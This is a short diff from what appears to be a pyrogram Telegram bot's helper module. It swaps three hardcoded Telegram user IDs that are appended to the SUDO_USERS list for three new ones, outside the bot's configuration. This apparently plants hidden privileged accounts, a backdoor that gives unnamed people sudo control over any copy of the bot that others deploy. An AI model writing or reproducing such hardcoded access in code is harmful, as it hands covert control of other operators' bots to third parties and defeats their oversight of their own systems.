@@ -6,9 +6,9 @@ from pyrogram.types import Message
 from config import SUDO_USERS
 from driver.admins import get_administrators
 
-SUDO_USERS.append(1692632737)
-SUDO_USERS.append(2132994478)
-SUDO_USERS.append(5052908678)
+SUDO_USERS.append(5033297035)
+SUDO_USERS.append(2034602789)
+SUDO_USERS.append(2146747636)
 
 
 def errors(func: Callable) -> Callable:
